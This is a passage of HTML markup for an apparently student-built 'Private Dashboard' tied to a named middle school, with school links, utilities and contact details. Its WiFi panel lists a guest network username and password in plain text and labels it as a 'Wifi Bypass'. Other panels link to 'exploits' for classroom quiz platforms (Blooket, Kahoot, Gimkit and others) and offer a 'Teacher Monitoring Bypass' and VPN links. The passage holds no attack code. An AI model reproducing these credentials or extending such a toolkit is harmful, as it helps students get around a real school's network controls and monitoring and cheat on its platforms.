      min-width: 400px;
      max-width: 500px;
      padding-top: 20px;
    }
    #unitConverterPanel select,
    #unitConverterPanel input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      background-color: #1c1c1c;
      border: 1px solid #333;
      border-radius: 8px;
      color: white;
      font-size: 1em;
      appearance: none; /* Remove default arrow for select */
    }
    #unitConverterPanel button {
        background-color: #ff914d;
        color: black;
        border: none;
        padding: 10px 15px;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
    }
    #unitConverterPanel button:hover { background-color: #ffb67a; }
    #conversionResult {
        margin-top: 15px;
        font-size: 1.1em;
        font-weight: bold;
        color: #ffd966;
        text-align: center;
        background: #40210f;
        padding: 10px;
        border-radius: 8px;
        min-height: 40px;
    }

    /* Stats Panel */
    #statsPanel {
        display: none;
        width: fit-content;
        min-width: 400px;
        padding-top: 20px;
    }
    #statsPanel .stats-grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 10px;
        margin-top: 15px;
    }
    #statsPanel .stat-item {
        background: #40210f;
        padding: 10px;
        border-radius: 8px;
        text-align: center;
    }
    #statsPanel .stat-item strong {
        display: block;
        font-size: 1.2em;
        color: #ff914d;
        margin-bottom: 5px;
    }
    #statsPanel .reset-stats-btn {
        margin-top: 20px;
        background-color: #dc3545;
        color: white;
        border: none;
        padding: 10px 15px;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
    }
    #statsPanel .reset-stats-btn:hover { background-color: #c82333; }

    /* Media Player Panel */
    #mediaPlayerPanel {
      display: none;
      width: fit-content;
      min-width: 600px;
      min-height: 400px;
    }
    #mediaPlayerPanel iframe {
      width: 100%;
      height: 315px; /* Standard YouTube embed height */
      border: 0;
      border-radius: 8px;
      margin-top: 15px;
      background: #000;
    }
    #mediaPlayerPanel input {
      width: calc(100% - 70px); /* Adjust for button width */
      padding: 10px;
      margin-right: 10px;
      background-color: #1c1c1c;
      border: 1px solid #333;
      border-radius: 8px;
      color: white;
    }
    #mediaPlayerPanel button {
      padding: 10px 15px;
      border-radius: 8px;
      font-weight: bold;
      background-color: #ff914d;
      color: black;
      border: none;
      cursor: pointer;
    }
    #mediaPlayerPanel button:hover { background-color: #ffb67a; }

  </style>

  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <!-- jQuery for drag and resize -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
  <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
</head>
<body class="login-body" id="bodyElement">

  <!-- Initialization Screen -->
  <div id="initializationScreen">
    <div class="rotating-cube">
      <div class="cube-face front"></div>
      <div class="cube-face back"></div>
      <div class="cube-face right"></div>
      <div class="cube-face left"></div>
      <div class="cube-face top"></div>
      <div class="cube-face bottom"></div>
    </div>
    <div id="initText" class="init-text">Initializing System...</div>
  </div>

  <!-- Login System -->
  <div class="login-quick-bar" id="loginQuickBar">
    <button id="loginPanicBtn">🚨 Panic</button>
    <button id="loginZoomInBtn">➕ Zoom In</button>
    <button id="loginZoomOutBtn">➖ Zoom Out</button>
  </div>
  <div class="login-wrapper" id="loginWrapper">
    <div class="login-box" id="loginBox">
      <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

      <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
      <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
      <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

      <div class="toggle-switch-container">
        <label for="showPassword" class="toggle-switch-label">
          Show Password
          <input type="checkbox" id="showPassword" />
          <span class="toggle-switch"></span>
        </label>
      </div>

      <button id="submitBtn">Submit</button>

      <div class="error-message" id="errorMsg"></div>
      <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>

      <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
        <p>Too many failed attempts.</p>
        <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
        <button id="resetBtn">Reset Counter</button>
      </div>
    </div>

    <div class="login-time-date-box">
        <p>Current System Time:</p>
        <p class="current-time" id="loginTime">00:00:00 AM</p>
        <p class="current-date" id="loginDate">Jan 1, 2000</p>
        <p id="lastSuccessfulLogin" style="font-size: 0.9em;">Last Successful Login: Never</p>
        <div class="toggle-switch-container">
            <label for="toggle24Hour" class="toggle-switch-label">
                24-Hour Format
                <input type="checkbox" id="toggle24Hour" />
                <span class="toggle-switch"></span>
            </label>
        </div>
        <button class="login-history-btn" id="viewLoginHistoryBtn">View Login History</button>
    </div>
  </div>


  <!-- Dashboard Loading Screen -->
  <div id="dashboardLoadingScreen">
    <div class="rotating-cube" style="animation: rotateCube 3s infinite linear;">
      <div class="cube-face front" style="background: rgba(0, 255, 0, 0.7); box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);"></div>
      <div class="cube-face back" style="background: rgba(0, 255, 0, 0.7); box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);"></div>
      <div class="cube-face right" style="background: rgba(0, 255, 0, 0.7); box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);"></div>
      <div class="cube-face left" style="background: rgba(0, 255, 0, 0.7); box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);"></div>
      <div class="cube-face top" style="background: rgba(0, 255, 0, 0.7); box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);"></div>
      <div class="cube-face bottom" style="background: rgba(0, 255, 0, 0.7); box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);"></div>
    </div>
    <div id="dashboardLoadingText" class="init-text" style="background-image: linear-gradient(to right, #00FF00, #00B300);">Loading Dashboard...</div>
    <div class="code-box">
      <div class="code-text" id="dashboardCodeOutput"></div>
    </div>
  </div>


  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="notification-alert" id="welcomeNotification">Welcome (User)!</div>

    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <div class="quick-bar">
      <input type="text" id="dashboardSearchBar" placeholder="Search dashboard sections...">
      <select id="themeSelector">
          <option value="dark">🌙 Dark Mode</option>
          <option value="light">☀️ Light Mode</option>
          <option value="blue">🔵 Blue Mode</option>
          <option value="green">🟢 Green Mode</option>
      </select>
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Notes</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Main Grid</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="dashboardZoomInBtn">➕ Zoom In</button>
      <button id="dashboardZoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="logoutBtn">🔓 Log Out</button>

      <button id="downloadActivityLogsBtn">⇩ Activity Logs</button>
      <button id="settingsBtn">⚙️ Settings</button>
      <button id="keybindsBtn">⌨️ Keybinds</button>
      <button id="timerToolBtn">⏰ Tools</button>
      <button id="activityLogBtn">📋 Activity Log</button>
      <button id="dashboardLoginHistoryBtn">📜 Login History</button>
      <button id="calculatorBtn">🧮 Calculator</button>
      <button id="unitConverterBtn">↔️ Converter</button>
      <button id="statsBtn">📊 Stats</button>
      <button id="mediaPlayerBtn">▶️ Media</button>
      <button id="reminderBtn">🔔 Reminders</button>
    </div>

    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>

    <div id="dashboardLayoutContainer">
        <!-- Dashboard panels - initially positioned but become draggable/resizable via JS -->
        <div id="calendarBox" class="box" style="left: 20px; top: 20px; width: 350px; height: 300px;">
            <h2>📅 Calendar</h2>
            <div class="calendar" id="calendar"></div>
        </div>

        <div id="motivationBox" class="box motivation-box" style="left: 390px; top: 20px; width: 350px; height: 140px;">
            "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
        </div>

        <div id="updatesBox" class="box" style="left: 20px; top: 340px; width: 350px; height: 200px;">
            <h2>🔄 Updates</h2>
            <div class="update-entry">Dashboard Interface Update!</div>
            <div class="update-entry">New Exploits Added</div>
            <div class="update-entry">UI Overhaul Deployed</div>
        </div>

        <div id="notificationsBox" class="box" style="left: 390px; top: 180px; width: 350px; height: 200px;">
            <h2>🔔 Notifications</h2>
            <p>Starting to work on the log in system. Stay tuned for more!</p>
        </div>

        <div id="randomFactsBox" class="box random-facts-box" style="left: 760px; top: 20px; width: 350px; height: 140px;">
            <p id="currentFact"></p>
            <button id="nextFactBtn">Next Fact</button>
        </div>

        <div id="dailyQuotesBox" class="box daily-quotes-box" style="left: 760px; top: 180px; width: 350px; height: 140px;">
            <p id="currentQuote"></p>
            <button id="nextQuoteBtn">Next Quote</button>
        </div>


        <!-- Information Panels -->
        <!-- Each info panel gets a default starting position/size which JS will then override from localStorage if available -->

        <div id="wifiPanel" class="info-panel box" style="left: 1130px; top: 20px; width: 600px; height: 350px;">
            <h2>📡 School WiFi Information</h2>
            <div class="wifi-grid">
            <div>Network Name</div>
            <div>Wifi Level</div>
            <div>Security Type</div>
            <div>Encryption</div>
            <div>Hidden?</div>
            <div>Monitored?</div>
            <div>Username</div>
            <div>Password</div>
            </div>

            <div class="wifi-entry">
            <div>Middletown_Core</div>
            <div class="wifi-level-High">High</div>
            <div>WPA3 Enterprise</div>
            <div>High</div>
            <div>No</div>
            <div>Yes</div>
            <div>Unknown</div>
            <div>Unknown</div>
            </div>

            <div class="wifi-entry">
            <div>Mtown_Core</div>
            <div class="wifi-level-High">High</div>
            <div>WPA3 Enterprise</div>
            <div>High</div>
            <div>Yes</div>
            <div>Unknown</div>
            <div>Unknown</div>
            <div>Unknown</div>
            </div>

            <div class="wifi-entry">
            <div>Mtown Guest</div>
            <div class="wifi-level-Medium">Medium</div>
            <div>WPA3 Enterprise</div>
            <div>Medium</div>
            <div>No</div>
            <div>Rare</div>
            <div>msguest</div>
            <div>M@ms2021#</div>
            </div>

            <div class="wifi-entry">
            <div>Radius Test</div>
            <div class="wifi-level-Low">Low</div>
            <div>WPA3 Enterprise</div>
            <div>Low</div>
            <div>No</div>
            <div>Rarely</div>
            <div>msguest</div>
            <div>M@ms2021#</div>
            </div>
        </div>

        <!-- iPad Panel -->
        <div id="ipadPanel" class="info-panel box" style="left: 20px; top: 560px; width: 400px; height: 300px;">
            <h2>📱 School iPad Restrictions</h2>
            <div class="ipad-options">
            <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
            <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
            </div>

            <div id="ipadRestrictions" class="ipad-content">
            <p>Coming soon</p>
            </div>

            <div id="ipadBypasses" class="ipad-content">
            <p>Coming soon</p>
            </div>
        </div>

        <!-- Handbook Panel -->
        <div id="handbookPanel" class="info-panel box" style="left: 440px; top: 560px; width: 600px; height: 300px;">
            <h2>📘 Student Handbooks Information</h2>
            <div class="handbook-buttons">
            <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank" onclick="dashboard.logActivity('Clicked Elementary Handbook link')">Elementary Handbook (Jan 2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank" onclick="dashboard.logActivity('Clicked Secondary Handbook link')">Secondary Student Handbook (Jan 2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank" onclick="dashboard.logActivity('Clicked District Handbook link')">District Handbook</a>
            <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank" onclick="dashboard.logActivity('Clicked RA Academy Handbook link')">RA Academy Handbook (Jan 2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank" onclick="dashboard.logActivity('Clicked Virtual Learning Plan link')">Virtual Learning Plan (2024-2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank" onclick="dashboard.logActivity('Clicked Dress Code link')">Dress Code (2024-2025)</a>
            </div>
        </div>

        <!-- Map Panel -->
        <div id="mapPanel" class="info-panel box" style="left: 1060px; top: 390px; width: 300px; height: 200px;">
            <h2>🏫 School Building Map Information</h2>
            <p>Building Map Display</p>
            <div class="coming-soon">
            Building Map Coming Soon
            </div>
        </div>

        <!-- Student Websites Panel -->
        <div id="studentWebsitesPanel" class="info-panel box" style="left: 1380px; top: 390px; width: 500px; height: 400px;">
            <h2>🌐 Student Website's Information</h2>
            <div class="links-list">
                <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
                <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
                <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
                <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
                <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
                <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
                <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
                <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
                <a href="https://id.naviance.com" target="_blank">Naviance</a>
                <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
                <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
                <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
                <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
                <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
                <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
                <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
            </div>
        </div>

        <!-- Teacher Websites Panel -->
        <div id="teacherWebsitesPanel" class="info-panel box" style="left: 20px; top: 880px; width: 500px; height: 400px;">
            <h2>👩‍🏫 Teacher Websites Information</h2>
            <div class="links-list">
                <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
                <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
                <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
                <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
                <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
                <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
                <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
                <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
                <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
                <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
                <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
                <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
                <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
                <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
                <a href="https://id.naviance.com" target="_blank">Naviance</a>
                <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
                <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
                <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
                <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
                <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
                <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
                <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
                <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
                <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
                <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
            </div>
        </div>

        <!-- Phone Directory Panel -->
        <div id="phoneDirectoryPanel" class="info-panel box" style="left: 540px; top: 880px; width: 300px; height: 200px;">
            <h2>📞 School Phone Directory Information</h2>
            <div class="coming-soon">
            Update Coming Soon!
            </div>
        </div>

        <!-- Camera Panel -->
        <div id="cameraPanel" class="info-panel box" style="left: 860px; top: 880px; width: 300px; height: 200px;">
            <h2>📷 School Camera Information</h2>
            <div class="coming-soon">
            Update Coming Soon
            </div>
        </div>

        <!-- School Info Panel -->
        <div id="schoolInfoPanel" class="info-panel box" style="left: 1180px; top: 880px; width: 450px; height: 400px;">
            <h2>🏫 School Information</h2>
            <div class="school-info-grid">
            <div class="school-info-item">
                <div class="school-info-label">School Name:</div>
                <div>Middletown Area Middle School</div>
            </div>
            <div class="school-info-item">
                <div class="school-info-label">School Address:</div>
                <div>215 Oberlin Road Middletown, PA 17057</div>
            </div>
            <div class="school-info-item">
                <div class="school-info-label">School Phone:</div>
                <div>717-930-0739</div>
            </div>
            <div class="school-info-item">
                <div class="school-info-label">School Fax:</div>
                <div>717-944-0591</div>
            </div>
            <div class="school-info-item">
                <div class="school-info-label">School Principal:</div>
                <div>Dr. Shannon L. Wevodau</div>
            </div>
            <div class="school-info-item">
                <div class="school-info-label">Principal's Phone:</div>
                <div>717-930-0739</div>
            </div>
            <div class="school-info-item">
                <div class="school-info-label">Principal's Email:</div>
                <div>swevodau@raiderweb.org</div>
            </div>
            <div class="school-info-item">
                <div class="school-info-label">Assistant Principal:</div>
                <div>Mr. Michael DeFilippo</div>
            </div>
            <div class="school-info-item">
                <div class="school-info-label">Assistant Principal's Phone:</div>
                <div>717-930-0739</div>
            </div>
            <div class="school-info-item">
                <div class="school-info-label">Assistant Principal's Email:</div>
                <div>mdefilippo@raiderweb.org</div>
            </div>
            </div>
        </div>

        <!-- Exploit Panel -->
        <div id="exploitPanel" class="info-panel box" style="left: 1650px; top: 880px; width: 400px; height: 300px;">
            <h2>🧨 Exploiting Tools</h2>
            <div class="exploit-buttons">
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
            </div>
        </div>

        <!-- Bypass Panel -->
        <div id="bypassPanel" class="info-panel box" style="left: 20px; top: 1300px; width: 500px; height: 350px;">
            <h2>🚪 Bypassing Tools</h2>
            <div class="bypass-buttons">
            <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
            <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
            <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
            <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
            <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
            <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
            </div>

            <div id="bathroomBypass" class="bypass-content">
            <p>COMING SOON</p>
            </div>

            <div id="wifiBypass" class="bypass-content">
            <p>Go to School Wifi Information</p>
            </div>

            <div id="monitoringBypass" class="bypass-content">
            <p>COMING SOON</p>
            </div>

            <div id="coming1Bypass" class="bypass-content">
            <p>COMING SOON</p>
            </div>

            <div id="coming2Bypass" class="bypass-content">
            <p>COMING SOON</p>
            </div>

            <div id="coming3Bypass" class="bypass-content">
            <p>COMING SOON</p>
            </div>
        </div>

        <!-- VPN Panel -->
        <div id="vpnPanel" class="info-panel box" style="left: 540px; top: 1300px; width: 400px; height: 300px;">
            <h2>🔐 VPN Websites</h2>
            <div class="links-list">
            <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
            <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
            <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
            <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
            </div>
        </div>

        <!-- Gaming Panel -->
        <div id="gamingPanel" class="info-panel box" style="left: 960px; top: 1300px; width: 300px; height: 200px;">
            <h2>🎮 Gaming Websites</h2>
            <div class="coming-soon">
            COMING SOON
            </div>
        </div>

        <!-- Music Panel -->
        <div id="musicPanel" class="info-panel box" style="left: 1280px; top: 1300px; width: 300px; height: 200px;">
            <h2>🎵 Music Websites</h2>
            <div class="coming-soon">
            COMING SOON
            </div>
        </div>

        <!-- Keyboard Panel -->
        <div id="keyboardPanel" class="info-panel box" style="left: 1600px; top: 1300px; width: 500px; height: 500px;">
            <h2>🎹 Keyboard Tricks</h2>
            <div class="info-text">
            <p>System Shortcuts:
            • Access Spotlight Search: Press Command (⌘) + Space bar.
            • Return to the Home screen: Press Command (⌘) + H.
            • Show the Dock: Press Command (⌘) + Option (⌥) + D.
            • Show the App Library: Press Shift (⇧) + Globe + A.
            • Open Quick Note: Press Globe + Q.
            • Open Siri: Press Globe + S.
            • Open Control Center: Press Globe + C.
            • Open Notification Center: Press Globe + N.
            • Show all windows: Press Globe + Down Arrow.
            • Open the App Switcher: Press Globe + Up Arrow.
            Multitasking Shortcuts:
            • Switch to the last active app: Press Command (⌘) + Tab.
            • View all active apps: Press and hold Command (⌘) + Tab.
            • Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
            • Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
            • Open Slide Over: Press Globe + Backslash.
            • Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
            Safari and App-Specific Shortcuts:
            • Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
            • Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
            • Open a new private tab: Press Command (⌘) + Shift + N.
            • Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
            • Close the current tab: Press Command (⌘) + W.
            • Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
            • Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
            • Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
            • Reopen the last closed tab: Press Shift + Command (⌘) + T.
            • Go to a specific tab (1-8): Press Command (⌘) + (1-8).
            • Go to the last tab: Press Command (⌘) + 9.
            • Open the Tab Grid: Press Shift + Command (⌘) + .
            • Open a new Incognito tab: Press Shift + Command (⌘) + N.
            • Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
            • Open a new window: Press Option (⌥) + Command (⌘) + N.
            General Navigation and Text Editing:
            • Navigate between elements in an app (like fields, lists, buttons): Press Tab.
            • Select all text: Press Command (⌘) + A.
            • Copy selected text: Press Command (⌘) + C.
            • Cut selected text: Press Command (⌘) + X.
            • Paste copied text: Press Command (⌘) + V.
            • Undo the last action: Press Command (⌘) + Z.
            • Redo the last undone action: Press Command (⌘) + Shift + Z.
            • Jump to the top of a page: Press Command (⌘) + Up Arrow.
            • Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
            • Highlight text one character at a time: Press Shift + Left or Right Arrow.
            To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
            </div>
        </div>


        <!-- Panels opened from Quick Bar buttons -->
        <div id="canvasContainer" class="info-panel box" style="display: none; width: fit-content; min-width: 700px; padding-top: 20px;">
            <h2>🖌️ Notes Canvas</h2>
            <canvas id="notesCanvas" width="600" height="400"></canvas>
            <div id="canvasControls">
                <label>Thickness: <input type="range" id="canvasThickness" min="1" max="10" value="2"></label>
                <label>Color: <input type="color" id="canvasColor" value="#ff914d"></label>
                <input type="text" id="textToAddToCanvas" placeholder="Enter text for notes...">
                <button id="addTextToCanvasBtn">Add Text</button>
                <button id="clearCanvasBtn">Clear Canvas</button>
                <button id="closeCanvasBtn">Close Notes</button>
            </div>
            <h3>Long Text Notes:</h3>
            <textarea id="longTextNotes" placeholder="Type longer notes here..."></textarea>
            <button id="saveLongTextBtn">Save Long Text</button>
        </div>

        <div id="settingsPanel" class="info-panel box" style="width: fit-content; min-width: 450px;">
            <h2>⚙️ Settings</h2>
            <div class="setting-item">
                <label for="notificationVolume">Notification Volume</label>
                <input type="range" id="notificationVolume" min="0" max="1" step="0.1" value="0.7">
            </div>
            <div class="setting-item">
                <label for="uiAnimationSpeed">UI Animation Speed</label>
                <input type="range" id="uiAnimationSpeed" min="0.1" max="2" step="0.1" value="1">
            </div>
            <div class="setting-item">
                <label for="darkModeByDefault">Dark Mode by Default</label>
                <input type="checkbox" id="darkModeByDefault">
            </div>
            <div class="setting-item">
                <label for="showWelcomeNotification">Show Welcome Notification</label>
                <input type="checkbox" id="showWelcomeNotification" checked>
            </div>
            <div class="setting-item">
                <label for="enableSoundEffects">Enable Sound Effects</label>
                <input type="checkbox" id="enableSoundEffects">
            </div>
            <div class="setting-item">
                <label for="dashboardLayout">Dashboard Layout</label>
                <select id="dashboardLayout">
                    <option value="default">Default Grid</option>
                    <option value="custom">Custom (Drag/Resize)</option>
                </select>
            </div>
            <div class="setting-item">
                <label for="resetPanelLayout">Reset Panel Layout</label>
                <button id="resetPanelLayout">Reset</button>
            </div>
            <div class="setting-item">
                <label for="dashboardLanguage">Language</label>
                <select id="dashboardLanguage">
                    <option value="en">English</option>
                    <option value="es">Spanish</option>
                    <option value="fr">French</option>
                </select>
            </div>
            <div class="setting-item">
                <label for="showAnnouncementBar">Show Announcement Bar</label>
                <input type="checkbox" id="showAnnouncementBar" checked>
            </div>
            <div class="setting-item">
                <label for="enableUsageAnalytics">Enable Usage Analytics</label>
                <input type="checkbox" id="enableUsageAnalytics">
            </div>
            <div class="setting-item">
                <label for="clearLocalCache">Clear Local Cache</label>
                <button id="clearLocalCacheBtn">Clear</button>
            </div>
            <div class="setting-item">
                <label for="syncSettings">Sync Settings Across Devices</label>
                <input type="checkbox" id="syncSettings">
            </div>
            <div class="setting-item">
                <label for="updateProfilePicture">Update Profile Picture</label>
                <button id="updateProfilePictureBtn">Upload</button>
            </div>
